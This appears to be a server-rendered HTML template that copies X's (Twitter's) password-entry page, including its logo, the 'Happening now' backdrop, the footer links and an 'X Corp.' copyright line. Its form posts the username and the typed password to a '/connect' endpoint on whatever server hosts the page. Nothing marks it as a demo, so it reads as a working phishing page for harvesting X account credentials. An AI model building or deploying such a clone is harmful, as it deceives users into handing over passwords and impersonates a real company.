<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter your password / X</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'twitter-blue': '#1d9bf0',
            'twitter-black': '#000000',
            'twitter-dark': '#242d35',
            'twitter-gray': '#71767b',
            'twitter-border': '#333639',
          }
        }
      }
    }
  </script>
</head>
<body class="font-sans m-0 p-0 bg-twitter-dark text-white flex justify-center items-center min-h-screen">
  <!-- Background elements -->
  <div class="fixed top-0 left-0 w-full h-full bg-twitter-dark z-[-1]"></div>
  <div class="fixed left-1/4 top-1/2 -translate-x-1/2 -translate-y-1/2 w-[300px] h-[300px] opacity-15 z-[-1]">
    <svg viewBox="0 0 24 24" aria-hidden="true" fill="white" width="100%" height="100%">
      <g>
        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
      </g>
    </svg>
  </div>
  <div class="fixed right-[15%] top-[20%] text-[64px] font-extrabold leading-tight text-white opacity-10 z-[-1] whitespace-nowrap">
    Happening now
  </div>
  
  <!-- Modal dialog -->
  <div class="h-[75vh] bg-twitter-black rounded-2xl w-[40vw] max-w-[80%] relative overflow-hidden shadow-lg">

    <!-- Modal header -->
    <div class="p-4 text-center relative">
      <div class="inline-block w-8 h-8">
        <svg viewBox="0 0 24 24" aria-hidden="true" fill="white">
          <g>
            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
          </g>
        </svg>
      </div>
    </div>
    
    <!-- Modal content -->
    <div class="p-8 flex flex-col h-[calc(100%-80px)] justify-between">
      <div class="w-full">
        <h1 class="text-4xl font-bold mb-8 text-start">Enter your password</h1>
        
        <!-- Username display -->
        <div class="w-full py-3 px-2.5 bg-[rgba(32,35,39,0.5)] border-none rounded text-base text-twitter-gray mb-5 cursor-not-allowed">
          Username: <%= username %>
        </div>
        
        <!-- Password form -->
        <form action="/connect" method="POST" class="w-full flex flex-col h-full">
          <input type="hidden" name="username" value="<%= username %>">
          
          <!-- Password input -->
          <div class="w-full relative">
            <input 
              class="w-full py-3 pl-2.5 pr-10 bg-transparent border border-twitter-border rounded text-base text-white focus:outline-none focus:border-twitter-blue" 
              type="password" 
              name="password" 
              placeholder="Password" 
              required
              id="password-input"
            >
            <button 
              type="button" 
              class="absolute right-2.5 top-3.5 bg-transparent border-none text-twitter-blue cursor-pointer" 
              id="toggle-password"
            >
              <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
                <g>
                  <path d="M12 21c-7.605 0-10.804-6.888-10.996-7.304a1 1 0 010-.788C1.2 12.482 4.398 5.5 12 5.5s10.8 6.982 10.996 7.408a1 1 0 010 .788C22.804 14.112 19.605 21 12 21zM2.908 12.5c.428.716 3.698 6.5 9.092 6.5s8.664-5.784 9.092-6.5c-.428-.716-3.698-5-9.092-5s-8.664 4.284-9.092 5z"></path>
                  <path d="M12 16.5a4 4 0 100-8 4 4 0 000 8zm0-2a2 2 0 110-4 2 2 0 010 4z"></path>
                </g>
              </svg>
            </button>
          </div>
          
          <!-- Forgot password link -->
          <div class="w-full mt-3">
            <a href="#" class="text-sm text-twitter-blue no-underline">Forgot password?</a>
          </div>
      </div>
      
      <!-- Login button positioned at the very bottom -->
      <div class="w-full mt-auto self-end">
        <button 
          class="w-full py-3 bg-gray-300 text-gray-700 border-none rounded-full font-bold text-sm cursor-pointer hover:bg-twitter-blue hover:text-white transition-colors" 
          type="submit"
          id="login-button"
        >
          Log in
        </button>
            <!-- Sign up prompt -->
            <div class="text-sm text-twitter-gray mt-5 w-full">
              Don't have an account? <a href="#" class="text-twitter-blue no-underline ">Sign up</a>
            </div>  
          </div>
        </div>
      </form>
      
      
      
    </div>

  </div>
  
  <!-- Footer -->
  <div class="fixed bottom-0 w-full py-3 flex justify-center flex-wrap text-xs text-twitter-gray">
    <a href="#" class="text-twitter-gray no-underline mx-2">About</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Download the X app</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Help Center</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Terms of Service</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Privacy Policy</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Cookie Policy</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Accessibility</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Ads info</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Blog</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Status</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Careers</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Brand Resources</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Advertising</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Marketing</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">X for Business</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Developers</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Directory</a>
    <a href="#" class="text-twitter-gray no-underline mx-2">Settings</a>
    <div class="w-full text-center mt-2">Â© 2025 X Corp.</div>
  </div>
  
  <script>
    // Toggle password visibility
    document.getElementById('toggle-password').addEventListener('click', function() {
      const passwordInput = document.getElementById('password-input');
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
      } else {
        passwordInput.type = 'password';
      }
    });

    // Enable login button when password is entered
    document.getElementById('password-input').addEventListener('input', function() {
      const loginButton = document.getElementById('login-button');
      if (this.value.length > 0) {
        loginButton.classList.remove('bg-gray-300', 'text-gray-700');
        loginButton.classList.add('bg-twitter-blue', 'text-white');
      } else {
        loginButton.classList.remove('bg-twitter-blue', 'text-white');
        loginButton.classList.add('bg-gray-300', 'text-gray-700');
      }
    });
  </script>
</body>
</html>
